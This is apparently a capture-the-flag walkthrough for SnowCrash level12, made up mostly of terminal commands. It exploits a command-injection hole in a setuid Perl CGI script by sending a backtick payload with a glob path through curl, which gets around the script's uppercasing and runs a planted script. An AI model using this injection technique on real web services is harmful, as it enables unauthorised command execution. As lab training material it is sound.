# Level12

```console
level12@SnowCrash:~$ ls -la
total 16
dr-xr-x---+ 1 level12 level12  120 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level12 level12  220 Apr  3  2012 .bash_logout
-r-x------  1 level12 level12 3518 Aug 30  2015 .bashrc
-r-x------  1 level12 level12  675 Apr  3  2012 .profile
-rwsr-sr-x+ 1 flag12  level12  464 Mar  5  2016 level12.pl
```

```console
level12@SnowCrash:~$ cat level12.pl 
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

n(t(param("x"), param("y")));
```

```console
level12@SnowCrash:~$ echo "#\!/bin/bash" > /tmp/RUNME
level12@SnowCrash:~$ echo "getflag > /tmp/flag12.txt" >> /tmp/RUNME
```

```console
level12@SnowCrash:~$ cat /tmp/RUNME
#\!/bin/bash
getflag > /tmp/flag12.txt
```

```console
level12@SnowCrash:~$ chmod 777 -v /tmp/RUNME
mode of `/tmp/RUNME' changed from 0644 (rw-r--r--) to 0777 (rwxrwxrwx)
```

```console
curl '127.0.0.1:4646?x=`/*/RUNME`'
..level12@SnowCrash:~$ 
```

```console
level12@SnowCrash:~$ cat /tmp/flag12.txt
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```
